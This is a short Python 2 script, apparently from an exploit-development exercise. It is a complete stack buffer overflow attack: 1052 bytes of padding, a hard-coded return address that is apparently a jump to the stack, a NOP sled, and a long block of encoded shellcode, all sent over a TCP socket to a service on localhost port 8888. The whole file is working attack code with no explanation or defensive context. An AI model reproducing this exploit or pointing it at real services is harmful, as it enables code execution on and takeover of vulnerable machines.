import socket
import struct


host = "127.0.0.1"
port = 8888


shellcode = ("\xda\xd3\xd9\x74\x24\xf4\xbb\x12\xae\x90\x5e\x5e\x31\xc9\xb1"
"\x52\x31\x5e\x17\x83\xee\xfc\x03\x4c\xbd\x72\xab\x8c\x29\xf0"
"\x54\x6c\xaa\x95\xdd\x89\x9b\x95\xba\xda\x8c\x25\xc8\x8e\x20"
"\xcd\x9c\x3a\xb2\xa3\x08\x4d\x73\x09\x6f\x60\x84\x22\x53\xe3"
"\x06\x39\x80\xc3\x37\xf2\xd5\x02\x7f\xef\x14\x56\x28\x7b\x8a"
"\x46\x5d\x31\x17\xed\x2d\xd7\x1f\x12\xe5\xd6\x0e\x85\x7d\x81"
"\x90\x24\x51\xb9\x98\x3e\xb6\x84\x53\xb5\x0c\x72\x62\x1f\x5d"
"\x7b\xc9\x5e\x51\x8e\x13\xa7\x56\x71\x66\xd1\xa4\x0c\x71\x26"
"\xd6\xca\xf4\xbc\x70\x98\xaf\x18\x80\x4d\x29\xeb\x8e\x3a\x3d"
"\xb3\x92\xbd\x92\xc8\xaf\x36\x15\x1e\x26\x0c\x32\xba\x62\xd6"
"\x5b\x9b\xce\xb9\x64\xfb\xb0\x66\xc1\x70\x5c\x72\x78\xdb\x09"
"\xb7\xb1\xe3\xc9\xdf\xc2\x90\xfb\x40\x79\x3e\xb0\x09\xa7\xb9"
"\xb7\x23\x1f\x55\x46\xcc\x60\x7c\x8d\x98\x30\x16\x24\xa1\xda"
"\xe6\xc9\x74\x4c\xb6\x65\x27\x2d\x66\xc6\x97\xc5\x6c\xc9\xc8"
"\xf6\x8f\x03\x61\x9c\x6a\xc4\x4e\xc9\x75\x49\x27\x08\x75\x60"
"\xeb\x85\x93\xe8\x03\xc0\x0c\x85\xba\x49\xc6\x34\x42\x44\xa3"
"\x77\xc8\x6b\x54\x39\x39\x01\x46\xae\xc9\x5c\x34\x79\xd5\x4a"
"\x50\xe5\x44\x11\xa0\x60\x75\x8e\xf7\x25\x4b\xc7\x9d\xdb\xf2"
"\x71\x83\x21\x62\xb9\x07\xfe\x57\x44\x86\x73\xe3\x62\x98\x4d"
"\xec\x2e\xcc\x01\xbb\xf8\xba\xe7\x15\x4b\x14\xbe\xca\x05\xf0"
"\x47\x21\x96\x86\x47\x6c\x60\x66\xf9\xd9\x35\x99\x36\x8e\xb1"
"\xe2\x2a\x2e\x3d\x39\xef\x4e\xdc\xeb\x1a\xe7\x79\x7e\xa7\x6a"
"\x7a\x55\xe4\x92\xf9\x5f\x95\x60\xe1\x2a\x90\x2d\xa5\xc7\xe8"
"\x3e\x40\xe7\x5f\x3e\x41")

junk = "A" * 1052
jmp = struct.pack("<L" , 0x777f511f)
nop = "\x90" * 100
payload=junk + jmp + nop + shellcode


try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host , port))
    s.send(payload)
except:
    print "Try again"
